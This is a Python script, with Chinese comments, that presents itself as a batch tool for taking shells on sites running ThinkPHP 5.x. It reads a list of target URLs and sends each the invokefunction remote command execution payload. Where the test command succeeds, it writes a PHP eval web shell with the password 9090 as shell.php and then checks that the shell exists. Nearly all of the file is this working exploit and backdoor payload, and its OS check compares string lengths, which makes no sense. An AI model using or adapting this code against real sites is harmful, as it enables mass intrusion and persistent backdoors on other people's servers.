# -*- coding:UTF-8 -*-
#*********************************************
#------->>>>>>Author:秋某人的傻逼               *
#------->>>>>>Name:熊猫最爱皮卡丘                 *
#------->>>>>>Target:批量漏洞拿shell软件        *
#*********************************************

#thinkphp 5.x命令执行漏洞 一句话密码9090，进行了url编码：%3C?php%20@eval($_POST%5B'9090'%5D);?%3E
#/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=%3C?php%20@eval($_POST%5B'9090'%5D);?%3E


import re
import time
import urllib
from urllib import request
import requests
import webshellscaner
#------------------------
print ('请将网址导入到目录下的url_tp5.txt中！格式：http://www.baidu.com或者http://www.baidu.com/')
print ('序号：1.http://www.baidu.com   2.http://www.baidu.com/')
s = int(input('请输入网址格式序号：1 or 2:'))
list_url = []
if s == 1:
    print ('...ok1')
    list_url = []
    for line in open('url_tp5.txt','r'):
        print ('卢本伟牛逼！')
        print (line)
        list_url.append(line.strip('\n'))
    print (list_url)
    for i in list_url:
        try:
            print ('检测对象是：',i)
            print ('正在判断windows or linux服务器！请等待2秒程序继续运行！')
            time.sleep(2)
            win32 = i + r'/index.php'
            linux32 = i + r'/index.pHp'
            if len(win32) == len(linux32):
                print ('是windows服务器...进行入侵检测...')
                i_attack = i + r'/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ifconfig'
                print ('payload是:',i_attack)
                req = urllib.request.urlopen(i_attack)
                res = req.read()
                pattern = r'\d+.\d+.\d+.\d+'
                res_match = re.match(pattern,res.decode())
                if res_match:
                    print ('存在命令执行漏洞！')
                    print('命令执行结果是：',res)
                    print ('进行写入shell中...')
                    s_attack = i + r"/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=%3C?php%20@eval($_POST%5B'9090'%5D);?%3E"
                    print('payload是:', s_attack)
                    s_req_w = urllib.request.urlopen(s_attack)
                    res = s_req_w.read()
                    s_req = requests.get(s_attack)
                    if s_req.status_code == 200:
                        print('shell上传完毕，接下来验证shell是否存在！')
                        with open('result.txt','w') as f:
                            f.writelines(s_attack)
                            f.writelines('\n')
                            f.close()
                        webshellscaner.webshellscan('result.txt')
                else:
                    print('不存在命令执行漏洞！')
            else:
                print ('是linux服务器...进行入侵检测...')
                i_attack = i + r'/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ipconfig'
                print ('payload是:',i_attack)
                req = urllib.request.urlopen(i_attack)
                res = req.read()
                pattern = r'\d+.\d+.\d+.\d+'
                res_match = re.match(pattern,res.decode())
                if res_match:
                    print ('存在命令执行漏洞！')
                    print('命令执行结果是：',res)
                    print ('进行写入shell中...')
                    s_attack = i + r"/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=%3C?php%20@eval($_POST%5B'9090'%5D);?%3E"
                    print('payload是:', s_attack)
                    s_req_w = urllib.request.urlopen(s_attack)
                    res = s_req_w.read()
                    s_req = requests.get(s_attack)
                    if s_req.status_code == 200:
                        print('shell上传完毕，接下来验证shell是否存在！')
                        with open('result.txt','w') as f:
                            f.writelines(s_attack)
                            f.writelines('\n')
                            f.close()
                        webshellscaner.webshellscan('result.txt')
                else:
                    print('不存在命令执行漏洞！')
        except Exception as e:
            print (e)
            continue
    else:
        print ('...ok2')
        list_url = []
        for line in open('url_tp5.txt','r'):
            print ('卢本伟牛逼！')
            print (line)
            list_url.append(line.strip('\n'))
        print (list_url)
        for i in list_url:
            try:
                print ('检测对象是：',i)
                print ('正在判断windows or linux服务器！请等待2秒程序继续运行！')
                time.sleep(2)
                win32 = i + r'index.php'
                linux32 = i + r'index.pHp'
                if len(win32) == len(linux32):
                    print ('是windows服务器...进行入侵检测...')
                    i_attack = i + r'index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ifconfig'
                    print ('payload是:',i_attack)
                    req = urllib.request.urlopen(i_attack)
                    res = req.read()
                    pattern = r'\d+.\d+.\d+.\d+'
                    res_match = re.match(pattern,res.decode())
                    if res_match:
                        print ('存在命令执行漏洞！')
                        print('命令执行结果是：',res)
                        print ('进行写入shell中...')
                        s_attack = i + r"/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=%3C?php%20@eval($_POST%5B'9090'%5D);?%3E"
                        print('payload是:', s_attack)
                        s_req_w = urllib.request.urlopen(s_attack)
                        res = s_req_w.read()
                        s_req = requests.get(s_attack)
                        if s_req.status_code == 200:
                            print('shell上传完毕，接下来验证shell是否存在！')
                            with open('result.txt','w') as f:
                                f.writelines(s_attack)
                                f.writelines('\n')
                                f.close()
                            webshellscaner.webshellscan('result.txt')
                    else:
                        print('不存在命令执行漏洞！')
                else:
                    print ('是linux服务器...进行入侵检测...')
                    i_attack = i + r'index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ipconfig'
                    print ('payload是:',i_attack)
                    req = urllib.request.urlopen(i_attack)
                    res = req.read()
                    pattern = r'\d+.\d+.\d+.\d+'
                    res_match = re.match(pattern,res.decode())
                    if res_match:
                        print ('存在命令执行漏洞！')
                        print('命令执行结果是：',res)
                        print ('进行写入shell中...')
                        s_attack = i + r"/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=%3C?php%20@eval($_POST%5B'9090'%5D);?%3E"
                        print('payload是:', s_attack)
                        s_req_w = urllib.request.urlopen(s_attack)
                        res = s_req_w.read()
                        s_req = requests.get(s_attack)
                        if s_req.status_code == 200:
                            print('shell上传完毕，接下来验证shell是否存在！')
                            with open('result.txt','w') as f:
                                f.writelines(s_attack)
                                f.writelines('\n')
                                f.close()
                            webshellscaner.webshellscan('result.txt')
                    else:
                        print('不存在命令执行漏洞！')
            except Exception as e:
                print (e)
                continue